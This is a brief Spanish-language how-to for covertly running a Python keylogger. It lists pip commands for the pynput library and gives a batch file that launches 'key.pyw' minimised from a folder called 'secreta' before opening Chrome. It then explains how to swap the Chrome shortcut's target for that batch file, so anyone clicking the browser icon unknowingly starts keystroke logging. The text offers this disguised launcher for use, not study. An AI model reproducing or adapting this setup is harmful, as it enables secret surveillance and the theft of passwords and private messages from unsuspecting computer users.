Para ejecutar el Keylogger necesitan la libreria pynput.
Comando: pip install pynput (Mirko)
Otro comando: python -m pip install pynput (Bonilla y los demas)
Otro comando: py -m pip install pynput (Sara, Martha)

En el archivo .bat, codigo: 

@echo off
rem key.pyw
cd C:\secreta
start /MIN python key.pyw
rem chrome
cd C:\Program Files (x86)\Google\Chrome\Application
start chrome.exe
exit

En el primer cd va la ruta de la carpeta donde guardaste el keylogger.
En el segundo cd va la ruta en donde se encuentra tu chrome.exe
Finalmente en el icono de Chrome, anticlick, propiedades se cambia el destino por la ruta del archivo bat, ejemplo:
C:\secreta\chrome.bat
Y en el apartado ejecutar seleccionar en el combo, Minimizada
